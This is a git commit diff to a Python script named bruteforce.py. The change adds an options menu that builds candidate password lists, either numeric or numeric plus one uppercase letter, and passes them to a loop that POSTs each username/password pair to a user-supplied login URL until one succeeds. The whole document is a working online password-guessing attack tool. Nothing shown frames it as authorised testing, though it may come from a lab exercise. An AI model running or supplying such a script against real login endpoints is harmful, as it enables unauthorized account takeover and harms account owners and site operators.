15ef7461bbc898c7dbfa77a60182df336f2b1def
William2716057 <77903649+William2716057@users.noreply.github.com>
2025-05-08 16:19:07 +1200

    options added

--- bruteforce.py
+++ bruteforce.py
@@ -2,18 +2,29 @@ import requests
 import string
 
 url = input("Enter URL:")
-
 username = input("Enter username:")
 
 #generate numeric passwords
 count = int(input("Enter digit count:"))
-
 alphabet = list(string.ascii_uppercase)
 
-#password_list = [str(i).zfill(count) for i in range(10000)]
-password_list = [str(i).zfill(count) + letter for i in range(10000) for letter in alphabet]
+def options():
+        choice = input("Select 1 for numbers only \n Select 2 for numbers and letters")
 
-def brute_force():
+        if choice == "1":
+                return  [str(i).zfill(count) for i in range(10000)]
+        elif choice == "2":
+                return  [str(i).zfill(count) + letter for i in range(10000) for letter in alphabet]
+        else:
+                print("Invalid option")
+                return[]
+
+#alphabet = list(string.ascii_uppercase)
+
+#password_list = [str(i).zfill(count) for i in range(10000)]
+#password_list = [str(i).zfill(count) + letter for i in range(10000) for letter in alphabet]
+
+def brute_force(password_list):
         for password in password_list:
                 data = {"username": username, "password": password}
                 response = requests.post(url, data=data)
@@ -23,5 +34,12 @@ def brute_force():
                         break
                 else:
                         print(f" Attempted: {password}")
-brute_force()
+
+
+password_list = options()
+if password_list:
+        brute_force(password_list)
+
+
+
 
